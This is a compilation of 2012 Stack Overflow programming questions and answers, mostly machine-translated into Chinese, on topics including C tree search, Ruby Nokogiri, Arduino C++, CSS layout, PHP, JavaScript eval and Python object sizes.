# c - C实现中的多路树搜索算法

> ID：13530716
> 
> 赞同：2
> 
> 时间：2012-11-23T14:06:23.643
> 
> 标签：c, search, tree, multiway-tree

```
typedef struct dt {
    .....;
} Data;

typedef struct nd {
    int id;
    Data *data;
    struct tm *_parent;
    struct tm *_child[7];
} Node; 

Node* findNode(int id, Node *tree) {
    Node *p = tree;
    if (id == p->_id)
        return p;
    for (int i = 0; i < 7; i++) {
        if (id == p->_child[i]->_id) {
            p = p->_child[i];
            break;
        } else if(p->_child[i] != NULL) {
            findNode(id, p->_child[i]);
        }
    }

    return p;
} 
```

我有一个多路树，每个节点都包含 0-7 个子节点。可以不按特定顺序添加和删除子项。我正在尝试构建一个搜索算法，给定一个 id 将搜索树并返回一个指向特定节点的指针。我已经尝试像上面那样递归地做它，但没有太多运气。实际上可以递归地构建这个算法还是我还需要使用堆栈？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:11:28.083

> 实际上可以递归地构建这个算法吗？

是的，可以使用递归来做到这一点。

你在正确的轨道上。该代码只需要几个修复：

1.  的第一部分`if (id == p->_child[i]->_id)...`是完全多余的，因为它复制了递归调用无论如何都会做的事情（并且无法检查孩子是否是`NULL`）。
2.  当函数递归调用自身时，返回值被忽略。您需要弄清楚如何处理该返回值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:12:48.647

您的最终条件存在一些问题。如果循环没有找到id，则必须通过返回值可以检测到。在这种情况下将其设为 NULL 是明智的。这可以通过进行两个更改来完成：而不是设置 p 并执行 break，而是直接返回它（这样 for 循环只会在找不到 id 时完成），并将最后的 return p 更改为 return NULL。

然后在进行递归调用时，需要检查返回值。如果为 NULL，则继续。否则退回。

前面的答案是正确的，也可以更好地删除对子 ID 的检查，特别是因为它需要（但不）检查 NULL。

# fubumvc - Custom Errors in FubuMVC

> ID：13530720
> 
> 赞同：2
> 
> 时间：2012-11-23T14:06:33.863
> 
> 标签：fubumvc

Does FubuMVC work out of the box with custom error settings in the web.config or do I need to do extra work?

It is not working at the moment, but I'm not sure if I have done something wrong.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T19:32:46.710

不久前，我为此推出了一个行为，并写了一篇关于该技术的帖子。

[FubuMVC 劫持行为](http://blogs.dovetailsoftware.com/blogs/kmiller/archive/2012/04/24/fubumvc-hijacking-behaviors)

配置将选定的操作包装在一个行为中，该行为将用户引导到错误处理端点，为该端点的视图模型提供发生的异常。您可以使用它来模拟您自己的自定义错误处理页面（例如黄屏死机）。

此行为确实会检查应用程序 IsCustomErrorsEnabled 标志以获得良好的开发行为。

*注意：我不确定这在最新版本 0.99 nugets 上的表现如何。当我们将项目移动到最新位时，我会尽力更新。*

**另外**：我认为这种技术可以受益于 0.99 nugets 中的一些新功能，您可以轻松地将行为链接在一起。[Corey Kaylor 在他的帖子Creating a Diversion](http://coreykaylor.com/blog/2012/10/27/creating-a-diversion/)中谈到了这一点。

# ruby - 用 Nokogiri 和 Ruby 命名元素“文本”

> ID：13530722
> 
> 赞同：5
> 
> 时间：2012-11-23T14:06:53.770
> 
> 标签：ruby, nokogiri

在尝试使用 Nokogiri 构建 XML 文档时，我遇到了一个小问题。

我想将我的元素之一称为“文本”（请参阅​​下面粘贴代码的最底部）。通常，要创建一个新元素，我会执行以下操作`xml.text`——但这​​似乎`.text`是 Nokogiri 已经使用的一种方法来做其他事情。因此，当我写下这行代码时， `xml.text`Nokogiri 并没有创建一个名为的新元素`<text>`，而只是编写了作为元素内容的文本。我怎样才能让 Nokogiri 真正制作一个名为 的元素`<text>`？

```
builder = Nokogiri::XML::Builder.new do |xml|   
  xml.TEI("xmlns" => "http://www.tei-c.org/ns/1.0"){
    xml.teiHeader {
        xml.fileDesc{
            xml.titleStmt{
                xml.title "Version Log for #{title}"
                xml.author "Jeffrey C. Witt"
            }
            xml.editionStmt{
                xml.edition('n' => "#{ed_no}") {
                    xml.date('when' => "#{newDate}")
                    }
                }
            xml.publicationStmt{
                xml.publisher "#{publisher}"
                xml.pubPlace "#{pubPlace}"
                xml.availability("status" => "free") {
                    xml.p "Published under a Creative Commons Attribution ShareAlike 3.0 License"
                }
                xml.date("when" => "#{newDate}") 
            }   
            xml.sourceDesc {
                xml.p "born digital"
            }
        }
    }
    xml.text "test"{
      xml.body {
       xml.p "test document
       }
     }
  } 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-23T14:15:49.130

从[文档](http://nokogiri.org/Nokogiri/XML/Builder.html)：

> 构建器通过利用 method_missing 来工作。不幸的是，在 ruby​​ 中定义了一些难以删除或危险的方法。例如，您可能希望创建名称为“type”、“class”和“id”的标签。在这种情况下，您可以使用下划线来消除您的标签名称与方法调用的歧义。

因此，您所要做的就是在 之后添加下划线`text`，如下所示：

```
builder = Nokogiri::XML::Builder.new { |xml| xml.text_ "test" }
builder.to_xml
#=> "<?xml version=\"1.0\"?>\n<text>test</text>\n" 
```

# c++ - Strange method behaviour for second run

> ID：13530735
> 
> 赞同：0
> 
> 时间：2012-11-23T14:07:49.230
> 
> 标签：c++, memory, arduino, fuzzy-logic

I am writing an Arduino program that use a fuzzy logic to control the car, but I have problems with the C++, as the program behaves really strange. The first run gets me RIGHT results, but next runs shifts outputs in the array really strange way.

**EDIT:** I found out, that the problem is related to the number of FSets stored in the TermSet. If I put into TermSet more than 5 FSets, IT gives WRONG results only in the 3rd, 4th and 5th iteration. Other iterations gives RIGHT results.

My execution code is:

```
// Setup the FSets    
FSet errZ(0,2,0);   
FSet errDtZ(0,0.5,0);
FSet cntZ(0,4,0);   

//Setup the TermSets
TermSet errDt(-1,1,0.1,1);
TermSet err(-3,3,1,1);
TermSet cnt(-6,6,0.5,1);

void loop(){  

  //Fill the TermSets with FSets      
  int ierrDt = errDt.addFSet(&errDtZ);

  int ierr = err.addFSet(&errZ);       

  int icnt = cnt.addFSet(&cntZ);      

  //Create a single FRule for test
  //Passing in the errZ, errDtZ and cntZ FRules
  FRule rule1(&err,ierr,&errDt,ierrDt,&cnt,icnt);

  //Test if the cntZ FRule gives every loop correct answers
  // It shows up, that it does! - not included in output
  int j = 0;
  for(float i = -6; i <= 6; i = i + 0.5){
     Serial.print(i);
     Serial.print("/");
     Serial.print(cnt.getUODValue(j++));
     Serial.print(" - ");
     Serial.println(cntZ.lom(i));   
  }

  double x1 = -1.5;
  double x2 = 0.25;

  //
  Serial.println("===== SUMMARY =====");  
  // Call lom on FSets manualy - gives RIGHT RESULTS
  Serial.print("LOM1: ");
  Serial.println(errZ.lom(x1));

  Serial.print("LOM2: ");
  Serial.println(errDtZ.lom(x2));   
  Serial.println("===== END OF SUMMARY =====");   

  // Get the result of the rule - that gives sometime WRONG results
  double* output = rule1.ruleOutput(x1,x2);  

  // Output the returned array
  Serial.println();
  Serial.println("------- Rule outputs -------");
  for(int i = 0; i < cnt.UODLength(); i++){ 
     Serial.print(cnt.getUODValue(i)); // Universe of discourse value X
     Serial.print(" - ");   
     Serial.println(output[i]); // Outputed value for the givend X that belongs to UOD
  }  

  delay(5000);  

} 
```

This outputs something like this for 3 runs: // cntZ for WHOLE UOD - every run are correct - omitted from output in next runs `-6.00/-6.00 - 0.00` `-5.00/-5.00 - 0.00` `-4.00/-4.00 - 0.00` `-3.00/-3.00 - 0.25` `-2.00/-2.00 - 0.50` `-1.00/-1.00 - 0.75` `0.00/0.00 - 1.00` `1.00/1.00 - 0.75` `2.00/2.00 - 0.50` `3.00/3.00 - 0.25` `4.00/4.00 - 0.00` `5.00/5.00 - 0.00` `6.00/6.00 - 0.00`

```
RUN 1
===== SUMMARY =====
LOM1: 0.88 //THESE VALUES ARE ALWAYS OK
LOM2: 0.80 
===== END OF SUMMARY =====
LOM1 internal: 0.88 //THIS VALUE IS SOMETIMES WRONG - WHY?
LOM1 internal: 0.80
DOF internal: 0.80

LOM in -6.00 is 0.00
And output[i] is: 0.00
LOM in -5.00 is 0.00
And output[i] is: 0.00
LOM in -4.00 is 0.00
And output[i] is: 0.00
LOM in -3.00 is 0.25
And output[i] is: 0.25
LOM in -2.00 is 0.50
And output[i] is: 0.50
LOM in -1.00 is 0.75
And output[i] is: 0.75
LOM in 0.00 is 1.00
And output[i] is: 0.80
LOM in 1.00 is 0.75
And output[i] is: 0.75
LOM in 2.00 is 0.50
And output[i] is: 0.50
LOM in 3.00 is 0.25
And output[i] is: 0.25
LOM in 4.00 is 0.00
And output[i] is: 0.00
LOM in 5.00 is 0.00
And output[i] is: 0.00
LOM in 6.00 is 0.00
And output[i] is: 0.00

------- Rule outputs -------
-6.00 - 0.00
-5.00 - 0.00
-4.00 - 0.00
-3.00 - 0.25
-2.00 - 0.50
-1.00 - 0.75
0.00 - 0.80
1.00 - 0.75
2.00 - 0.50
3.00 - 0.25
4.00 - 0.00
5.00 - 0.00
6.00 - 0.00    

RUN 2

===== SUMMARY =====
LOM1: 0.88 //OK
LOM2: 0.80
===== END OF SUMMARY =====
LOM1 internal: 0.88 //OK
LOM1 internal: 0.80
DOF internal: 0.80

//HERE IT STARTS TO BE QUITE STRANGE
LOM in -6.00 is 0.00 
And output[i] is: 0.00
LOM in -5.00 is 85827176.00
And output[i] is: 0.80
LOM in -4.00 is 107218432.00
And output[i] is: 0.80
LOM in -3.00 is 142783152.00
And output[i] is: 0.80
LOM in -2.00 is 213912576.00
And output[i] is: 0.80
LOM in -1.00 is 428873696.00
And output[i] is: 0.80
LOM in 0.00 is -0.00
And output[i] is: -0.00
LOM in 1.00 is 0.00
And output[i] is: 0.00
LOM in 2.00 is 0.00
And output[i] is: 0.00
LOM in 3.00 is 0.00
And output[i] is: 0.00
LOM in 4.00 is 0.00
And output[i] is: 0.00
LOM in 5.00 is 0.00
And output[i] is: 0.00
LOM in 6.00 is 0.00
And output[i] is: 0.00

------- Rule outputs -------
//RULE OUTPUTS TOTALLY MIXED UP
-6.00 - 0.00
-5.00 - 0.80
-4.00 - 0.80
-3.00 - 0.80
-2.00 - 0.80
-1.00 - 0.80
0.00 - -0.00
1.00 - 0.00
2.00 - 0.00
3.00 - 0.00
4.00 - 0.00
5.00 - 0.00
6.00 - 0.00    

RUN 3
===== SUMMARY =====
LOM1: 0.88
LOM2: 0.80
===== END OF SUMMARY =====
LOM1 internal: 0.00 //THAT IS WRONG VALUE
LOM1 internal: 0.80
DOF internal: 0.00

//WRONG AGAIN
LOM in -6.00 is 0.00
And output[i] is: 0.00
LOM in -5.00 is 0.00
And output[i] is: 0.00
LOM in -4.00 is 0.00
And output[i] is: 0.00
LOM in -3.00 is 0.00
And output[i] is: 0.00
LOM in -2.00 is 0.00
And output[i] is: 0.00
LOM in -1.00 is 0.00
And output[i] is: 0.00
LOM in 0.00 is 0.00
And output[i] is: 0.00
LOM in 1.00 is 0.00
And output[i] is: 0.00
LOM in 2.00 is 0.00
And output[i] is: 0.00
LOM in 3.00 is 0.00
And output[i] is: 0.00
LOM in 4.00 is 0.00
And output[i] is: 0.00
LOM in 5.00 is 0.00
And output[i] is: 0.00
LOM in 6.00 is 0.00
And output[i] is: 0.00

//WRONG
------- Rule outputs -------
-6.00 - 0.00
-5.00 - 0.00
-4.00 - 0.00
-3.00 - 0.00
-2.00 - 0.00
-1.00 - 0.00
0.00 - 0.00
1.00 - 0.00
2.00 - 0.00
3.00 - 0.00
4.00 - 0.00
5.00 - 0.00
6.00 - 0.00 
```

The classes code is:

```
//Class representing the fuzzy set
FSet::FSet(double center, double delta, int inf){

    this->inf = inf;
    this->delta = delta;
    this->a = center - delta;
    this->b = center + delta;
    this->center = center;
}

//Return the level of matching of some crisp value
double FSet::lom(double crispValue) {
    if(inf == 0){
        if((crispValue < this->a) || (crispValue > this->b)){
            return 0.0;
        } else {

            return 1 - abs(crispValue-center)*(1.0/delta);
        }
    } else {
        if( ((crispValue < this->a) && (inf > 0)) ||
                ((crispValue > this->b) && (inf < 0))){
                return 0.0;
        }

        if((inf > 0) && (crispValue < center)){
            return 1 - abs(crispValue-center)*(1.0/delta);
        } else if((inf < 0) && (crispValue > center)){
            return 1 - abs(crispValue-center)*(1.0/delta);
        } else {
            return 1.0;
        }

    }

}

/*
 * Class that contains all the FuzzySets of the same variable
 * e.g.: TermSet err would include negativeErro, zeroError, positiveError etc.
 */
TermSet::TermSet(double a, double b, double step, int setsSize){
    //Boundaries of the Universe of discourse (UOD)
    this->a = a;
    this->b = b;
    //Step for discretization of the UOD
    this->step = step;

    //Index of the last inserted FSet
    this->last = -1;
    //Number of FSets
    this->setsSize = setsSize;
    this->sets = (FSet**) malloc(sizeof(FSet*) * setsSize);

    // The length of the universe of discourse
    this->length = (b-a)/step + 1;
}

TermSet::~TermSet(){
    free(this->sets);
}

// Return the FSet by index
FSet* TermSet::getFSet(int index){
        return this->sets[index];
}

/* Adds FSet to the TermSet
 * return the index of the FSet in the array
 */
int TermSet::addFSet(FSet* set){
    sets[++last] = set;
    return last;
}

/* Get the value of the UOD that is n steps
 * right of the begging of the UOD
 */
double TermSet::getUODValue(int n){
    return a + n*step;
}

// Return the length of the UOD
int TermSet::UODLength(){
    return length;
}

 /*
 * Class representing the FuzzyRule of form:
 * IF error is positive AND change of error is positive THEN change of control is negative
 * Which in code is represented as:
 * IF x1 is ant1[U1] AND x2 is ant2[U2] THEN y is con[D]
*/

FRule::FRule(TermSet* ant1, int u1, TermSet* ant2, int u2, TermSet* conTermSet, int d){
    // TermSet for the antecedent part of the rule
    this->ant1 = ant1;
    this->ant2 = ant2;

    //Indexes of the FRules in the antacendents ant1 and ant2
    this->U1 = u1;
    this->U2 = u2;

    //TermSet for the consequent part
    this->con = conTermSet;
    //Index of the consequent FRule in the con TermSet
    this->D = d;

    // Array of the output values
    output = (double*) malloc(sizeof(double) * con->UODLength());
}

FRule::~FRule(){
    free(output);
}

/* Get the degree of firing of the antacendent part
 * that is return the min of the FSet->lom(x) values;
 */
double FRule::dof(double x1,double x2){
    double pi1 = ant1->getFSet(U1)->lom(x1);
    double pi2 = ant2->getFSet(U2)->lom(x2);

    Serial.print("LOM1 internal: ");
    Serial.println(pi1);
    Serial.print("LOM1 internal: ");
    Serial.println(pi2);

    return min(pi1,pi2);
}

double* FRule::ruleOutput(double x1, double x2){
    // Get the degree of firing of the antacendent part
    double adof = this->dof(x1,x2);
    Serial.print("DOF internal: ");
    Serial.println(adof);

    /* Iterate throw the universe of discourse of the consequent part and
     * combine the lom of the consequent with value with the dof value of
     * antacendent using the min operator
     */
    double j = con->a;
    for (int i = 0; i < con->UODLength(); i++){
        double dlom = con->getFSet(D)->lom(j);

        Serial.print("LOM in ");
        Serial.print(j);
        Serial.print(" is ");
        Serial.println(dlom);

        output[i] = min(adof,dlom);
        j = j + con->step;

        Serial.print("And output[i] is: ");
        Serial.println(output[i]);
    }

    return output;
} 
```

I expect that the problem is in the `FRule->ruleOutput(double x1,double x2)` method, but I might be wrong. Also I think it must be some sort of memory problem, as I am new to C++ and not quite comfortable with the whole memory management.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:18:08.813

`i = i++`可能是罪魁祸首。在 C 或 C++ 中像这样修改变量两次，中间没有序列点，是未定义的行为。

你可能打算写`i++`.

# ios - SKPSMTPMessage liker 错误

> ID：13530736
> 
> 赞同：0
> 
> 时间：2012-11-23T14:07:51.557
> 
> 标签：ios, xcode

当我导入 SKPSMTPMessage 库时，我收到了您在照片中看到的错误：

![在此处输入图像描述](../Images/115e4309a553c8f37e3a28f115fc0d74.png)

关键是我不知道这意味着什么。我做了一个干净的，我已经添加了编译源下的文件，我已经添加了 CFNetwork 框架。知道是什么意思吗？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T13:02:15.020

看起来您的应用程序中也包含了 Dropbox SDK，它使用了一些与 SKPSMTP 相同的文件（用于 Base64 编码）。

我猜你需要删除：

```
NSData+Base64Additions.h
NSData+Base64Additions.m 
```

从 SMTP 文件夹。如果由于重复符号警告仍然无法编译，请尝试删除：

```
Base64Transcoder.h
Base64Transcoder.m 
```

当然，您应该检查 SMTP 是否正常工作，以确保 Dropbox SDK 的实现兼容。

# css - CSS填充水平空间

> ID：13530741
> 
> 赞同：0
> 
> 时间：2012-11-23T14:08:31.457
> 
> 标签：css, html

我已经看到很多关于如何使 div 填充所有可用空间的问题，但仍然没有得到它。

## 例子

```
<div>
    <div id="div1">    
        <div id="div2"></div>
        <div id="div3">
            Some text
        </div>
    </div>
</div>​ 
```

和 CSS

```
div { height:100px; }
#div1 { width: 100%; }
#div2 { background-color:blue; float:left; width:30%; }
#div3 { background-color:green; float:left; } 
```

我希望绿色`#div3`块填充所有水平空间，但上部 CSS 不起作用 - [jsFiddle](http://jsfiddle.net/NEJvS/1/)。

`width`如您所见，我没有手动设置。就算写`width: auto;`了也没用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:17:15.043

两种解决方案。

## 解决方案 1

将混凝土`width`（不是`auto`）设置为绿色元素，因为它是浮动的。

## 解决方案 2

不要漂浮你的绿色元素。根据您是否希望您的绿色元素包裹在蓝色元素下方（当更高时），适当地设置左边距。

```
margin-left: 30%; /* should always be right of the blue */ 
```

您可以随意设置其他边距。

## 绿色边距`div`

我不知道`div`当它的高度高于蓝色时，你是否允许你的绿色在蓝色下膨胀。但是假设你想保持它正确的蓝色`div`。

不浮动绿色应该使这最简单，因为您可以根据自己的喜好操纵绿色的尺寸。[这是一个示例](http://jsfiddle.net/NEJvS/19/)，显示`div`高于蓝色的绿色，不会在蓝色下环绕，并且具有以像素为单位设置的固定右边距。**作品**。

您还可以在绿色元素上添加额外的填充或边框，它仍然可以工作。

### [JSFiddle](http://jsfiddle.net/LXFcm/)中的示例

此示例向左浮动`div`并始终在其右侧保持绿色`div`，同时在它们之间添加一些空间。它使用以下支持的 CSS3`calc()`功能[我可以使用](http://caniuse.com/calc)数据吗？

如您所见，我还大大简化了您的 HTML：

```
<div class="left">Nav</div>
<div class="right">Content</div>​ 
```

CSS 包括其他特定于浏览器的`calc`使用设置，但在未来它们将变得过时并且只有最后一个设置`margin-left`才会被浏览器使用。

```
.left {
    background-color: #69c;
    height: 100px;
    float: left;
    width: 30%;
}
.right {
    background-color: #9c9;
    height: 150px;
    margin-left: -webkit-calc(30% + 10px);
    margin-left: -moz-calc(30% + 10px);
    margin-left: calc(30% + 10px);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:13:54.773

您需要为父 div[设置BG 颜色](http://jsfiddle.net/NEJvS/11/)

```
 #div1 { width: 100%;background-color:green; } 
```

如果您想使用 div3 则为该[div指定宽度](http://jsfiddle.net/NEJvS/18/)

```
#div3 { background-color:green; float:left; width: 70%; } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:16:12.363

如果你想要我认为你想要的... 将宽度：100% 设置为 div，将宽度：70% 设置为 div3。

如果这不是你想要的更具体一点

# php - 使用jquery动态生成选择框时选择框选项值不完美

> ID：13530750
> 
> 赞同：0
> 
> 时间：2012-11-23T14:09:21.213
> 
> 标签：php, jquery

```
<?php
$res = mysql_query($qry) or die(mysql_error());
while($data = mysql_fetch_row($res))
{
echo "<option value=".$data[0].">" .$data[0]. "</option>";<br>
} 
?> 
```

在这种情况下，假设`data[0]`有样本数据值，那么内部值只有样本存储。如何获得整体价值？

我通过`$.ajax`方法调用这个文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T20:00:51.363

您的问题是您的值没有用引号引起来。您可以通过两种方式解决此问题。

1：

```
<?php
$res = mysql_query($qry) or die(mysql_error());
while($data = mysql_fetch_row($res))
{
  echo '<option value="'.$data[0].'">' .$data[0]. '</option>';
} 
?> 
```

2.

```
<?php
$res = mysql_query($qry) or die(mysql_error());
while($data = mysql_fetch_row($res)):
?>
  <option value="<?php echo $data[0]; ?>"><?php echo $data[0]; ?></option>
<?php endwhile; ?> 
```

只需选择最适合您的那一款。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:21:26.983

你需要做的是这个

```
<?php while { ?>
<option value="<?php echo $data[0];?>"><?php echo $data[0];?></option>
<?php } ?> 
```

# session - 检查每个页面上的 cookie - 有效吗？

> ID：13530754
> 
> 赞同：1
> 
> 时间：2012-11-23T14:09:33.377
> 
> 标签：session, cookies

在每个页面上检查 cookie 是不是很糟糕？

我想知道我将在 cookie 中放入的用户国家/地区，但是我当前的设计模型会检查每个页面上的 cookie，以便以正确格式向他们显示他们所在国家/地区的货币。

这是最好的路线，还是有更有效的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:13:02.140

不，不是。如果设置了 cookie，浏览器无论如何都会在浏览器标头中发送它，并且可以通过变量访问。它已经占用了内存空间，检查它是否存在只会增加一点点开销。

如果您有一个每天/小时有数百万访问者的网站，那么值得研究一下微秒。但除此之外，就顺其自然吧。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:11:41.963

基本上你应该只做你需要做的，而不是更多（因为做任何与你的进一步行动无关的事情都是没有意义的）。但是很可能您没有拥有大量流量的网站，因此即使您根本不需要检查结果，您也可以一直进行检查并且您不会注意到（通常每个页面都包含一些代码所有页面共享，并且此代码可能会进行一些检查等，甚至不是所有包含它的页面都需要这样做。我会说你打扰是件好事，但可以保持原样（除非这些检查需要明显的时间 - 检查cookie 不是其中之一）。

# actionscript-3 - 在 actionscript3 中为声音转换添加变量时出错

> ID：13530759
> 
> 赞同：-1
> 
> 时间：2012-11-23T14:09:50.193
> 
> 标签：actionscript-3, flash

单击按钮时，我正在尝试调整声音的音量。

> 第 86 1120 行：未定义属性的访问`adjustVolume`。
> 
> 第 91 1120 行：访问未定义的属性`adjustVolume`。

这是代码

```
package 
{
import flash.display.MovieClip;
import flash.events.MouseEvent;
import flash.events.Event;
import flash.media.Sound;
import flash.media.SoundChannel;
import flash.net.URLRequest;
import fl.controls.CheckBox;
import fl.controls.Slider;
import flash.media.SoundTransform;

public class Track extends MovieClip
{
    public var trackSound:Sound;
    public var theChannel:SoundChannel;
    public var songName:String;
    public var currentStep:Number = 0;
    public var checkboxArray:Array;
    //public var adjustVolume:SoundTransform = new SoundTransform();
    /*adjustVolume.volume = 1;
    theChannel.soundTransform = adjustVolume;*/

    // onoff array of 16 false booleans
    public function Track()
    {
        // constructor code

        var adjustVolume:SoundTransform = new SoundTransform();
        adjustVolume.volume = 1;
        theChannel.soundTransform = adjustVolume;

        //trace( this.parent.name+"."+ this.name + " track created "  );
        singlePlay.addEventListener(flash.events.MouseEvent.CLICK, handlePlayClick);

        trackVolDown.addEventListener(flash.events.MouseEvent.CLICK, trackVolumeHandler);
        trackVolUp.addEventListener(flash.events.MouseEvent.CLICK, trackVolumeHandler);

        c1.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c2.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c3.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c4.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c5.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c6.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c7.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c8.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c9.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c10.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c11.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c12.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c13.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c14.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c15.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);
        c16.addEventListener(flash.events.MouseEvent.CLICK, handleStepClick);

        checkboxArray = new Array(c1,c2, c3, c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16);
        //trace (checkboxArray[0].selected);            
    }
    private function handlePlayClick(e:Event):void
    {
        //trace( this.parent.name+"."+ this.name +" Play clicked");
        this.playSound();
    }       
    public function setSoundName(theName:String)
    {
        this.songName = theName;
        trackSound = new Sound();
        var req:URLRequest = new URLRequest(this.songName);
        trackSound.addEventListener(Event.COMPLETE, onSoundLoaded);
        trackSound.load(req);
    }

    private function onSoundLoaded(e:Event):void
    {
        //trace(this.songName + " loaded into sequencer");
    }

    public function playSound( currentStep:Number = -1)
    {

        if (currentStep == -1)
        {
            theChannel = trackSound.play();
            theChannel.soundTransform = adjustVolume;//error here
        }
        else if (this.checkboxArray[currentStep].selected)
        {
            theChannel = trackSound.play();
            theChannel.soundTransform = adjustVolume;// and error here
        }
    }
    public function stopSound():void
    {
        theChannel.stop();
    }

    private function handleStepClick(e:Event):void
    {
        trace( this.name+'.'+(e.target as CheckBox).name);

    }   
    private function trackVolumeHandler(e:Event):void
    {
        //trace( this.parent.name+"."+ this.name +" Play clicked");
        this.soundTransform;
    }       

}
} 
```

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:13:36.023

## tl;博士

使用构造函数来初始化您的字段。

## 细节

替换以下行：

```
var adjustVolume:SoundTransform = new SoundTransform();
adjustVolume.volume = 1;
theChannel.soundTransform = adjustVolume; 
```

经过：

```
private var adjustVolume:SoundTransform;
public function Track()
{
    adjustVolume = new SoundTransform();
    adjustVolume.volume = 1;
    theChannel.soundTransform = adjustVolume;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T15:04:36.383

更换

```
public var theChannel:SoundChannel; 
```

和

```
public var theChannel:SoundChannel = new SoundChannel; 
```

现在可以了

# javascript - 将字符串作为 javascript 函数执行

> ID：13530761
> 
> 赞同：3
> 
> 时间：2012-11-23T14:10:07.517
> 
> 标签：javascript, jquery

我的对象有一个回调：

```
var MyObject = {
CallBack: "function (whichSubMenuIsClicked, subMenuObjectTag) { self.doStuff(whichSubMenuIsClicked.SubMenuItem, whichSubMenuIsClicked.HeaderColumnName, whichSubMenuIsClicked.DivIdentifier);}",
} 
```

回调是一个字符串。现在我需要使用 MyObject.CallBack(param1, param2) 执行它如何使用 jquery 或 javascript 来完成。在这种情况下， self 是调用另一个小部件的原始小部件。因此，回调在原始小部件上。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:12:10.830

只是没有将函数作为字符串。

将函数作为函数：

```
var MyObject = {
   CallBack: function (whichSubMenuIsClicked, subMenuObjectTag) {
                  self.doStuff(whichSubMenuIsClicked.SubMenuItem, whichSubMenuIsClicked.HeaderColumnName, whichSubMenuIsClicked.DivIdentifier);
             }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:17:24.550

使用`Function`构造函数，它接受参数名称列表，后跟函数体：

```
var MyObject = {
    CallBack: "self.doStuff(whichSubMenuIsClicked.SubMenuItem, whichSubMenuIsClicked.HeaderColumnName, whichSubMenuIsClicked.DivIdentifier)",
};

var myfunc = new Function("whichSubMenuIsClicked", "subMenuObjectTag", MyObject.CallBack); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:23:09.077

正如@Curt 演示的那样，您应该将函数编写为函数。只有当您除了将其作为字符串获取（例如从用户输入）之外别无选择时，您首先需要将其解析为可执行代码，然后您可以调用该代码。这样做的方法是[`eval`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/eval)。问题将成为参考`self`，它不是函数内部的变量，并且会被假定为全局变量。但是，您可以使用[`with`语句](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Statements/with)来解决此问题：

```
var MyObject = {
    CallBack: "function (whichSubMenuIsClicked, subMenuObjectTag) { self.doStuff(whichSubMenuIsClicked.SubMenuItem, whichSubMenuIsClicked.HeaderColumnName, whichSubMenuIsClicked.DivIdentifier);}",
};
var widget = {doStuff: console.log};
var fn;
with( {self: widget} ) {
    fn = eval( MyObject.CallBack );
}
fn({SubMenuItem: "…", HeaderColumnName: "…", DivIdentifier: "…"}); 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-11-23T14:12:45.180

非常糟糕的方法，但你可以通过`eval()`

```
var MyObject = { CallBack: "AName = function(param1, param2) { alert(param1 + param2); }", }

eval(MyObject.CallBack+"(1,2)"); 
```

[演示](http://jsfiddle.net/DqZpa/)

# python - 如何知道数组和字典等python对象的字节大小？- 简单的方法

> ID：13530762
> 
> 赞同：65
> 
> 时间：2012-11-23T14:10:07.993
> 
> 标签：python, object, memory, size, byte

我正在寻找一种简单的方法来了解数组和字典对象的字节大小，例如

```
[ [1,2,3], [4,5,6] ] or { 1:{2:2} } 
```

许多主题都说要使用 pylab，例如：

```
from pylab import *

A = array( [ [1,2,3], [4,5,6] ] )
A.nbytes
24 
```

但是，字典呢？我看到很多建议使用 pysize 或 heapy 的答案。Torsten Marek 在此链接中给出了一个简单的答案：[推荐使用哪种 Python 内存分析器？](https://stackoverflow.com/questions/110259/python-memory-profiler)，但我对输出没有明确的解释，因为字节数不匹配。

Pysize 似乎更复杂，我还不清楚如何使用它。

鉴于我想要执行的大小计算的简单性（没有类也没有复杂的结构），有什么简单的方法可以大致估计此类对象的内存使用情况吗？

亲切的问候。

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2012-11-23T14:13:11.813

有：

```
>>> import sys
>>> sys.getsizeof([1,2, 3])
96
>>> a = []
>>> sys.getsizeof(a)
72
>>> a = [1]
>>> sys.getsizeof(a)
80 
```

但我不会说它那么可靠，因为 Python 对每个对象都有开销，并且有些对象只包含对其他对象的引用，因此它与 C 和其他语言中的不太一样。

阅读[sys.getsizeof](http://docs.python.org/dev/library/sys#sys.getsizeof)上的文档并从那里开始我猜。

* * *

## 回答 #2

